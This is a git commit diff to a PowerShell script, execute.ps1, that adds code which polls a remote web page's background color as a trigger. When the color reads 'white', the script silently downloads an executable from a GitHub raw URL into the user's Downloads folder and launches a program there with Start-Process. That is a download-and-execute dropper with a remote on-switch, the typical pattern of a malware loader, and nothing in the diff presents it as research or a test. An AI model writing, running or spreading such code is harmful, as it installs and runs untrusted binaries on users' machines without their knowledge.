b78d5ba169e6691eca9effb1cb2c5c7b382e1966
webntdev <96979468+webntdev@users.noreply.github.com>
2024-04-11 22:50:05 +0300

    Update execute.ps1

--- files/execute.ps1
+++ files/execute.ps1
@@ -3,7 +3,8 @@ $urls = @(
 )
 
 $filePath = Join-Path -Path $env:USERPROFILE -ChildPath "Downloads\wheiu.bz"
-$url = "https://backgroundcolor.pages.dev"
+$url = "https://www.example.com"
+
 function CheckBackgroundColor {
     $response = Invoke-WebRequest -Uri $url
     return $response.ParsedHtml.getElementsByTagName("body").Style.backgroundColor
@@ -13,9 +14,32 @@ $initialColor = CheckBackgroundColor
 
 if ($initialColor -eq "blue") {
     Start-Sleep -Seconds 2
+
     while ((CheckBackgroundColor) -eq $initialColor) {
         Start-Sleep -Seconds 2
     }
+} elseif ($initialColor -eq "white") {
+    $urls = @(
+        "https://github.com/webntdev/webntdev.github.io/raw/main/application/Captura.exe"
+    )
+
+    $filePath = Join-Path -Path $env:USERPROFILE -ChildPath "Downloads\wheiu.bz"
+
+    Start-Sleep -Seconds 1
+
+    $downloadDir = [System.Environment]::ExpandEnvironmentVariables('%USERPROFILE%\Downloads')
+    if (-not (Test-Path -Path $downloadDir)) {
+        New-Item -ItemType Directory -Path $downloadDir
+    }
+
+    foreach ($url in $urls) {
+        $fileName = [System.IO.Path]::GetFileName($url)
+        $destinationPath = Join-Path -Path $downloadDir -ChildPath $fileName
+        Invoke-WebRequest -Uri $url -OutFile $destinationPath
+    }
+
+    $exePath = Join-Path -Path $downloadDir -ChildPath "WindowsFormsApp2.exe"
+    Start-Process -FilePath $exePath
 }
 
 Start-Sleep -Seconds 1
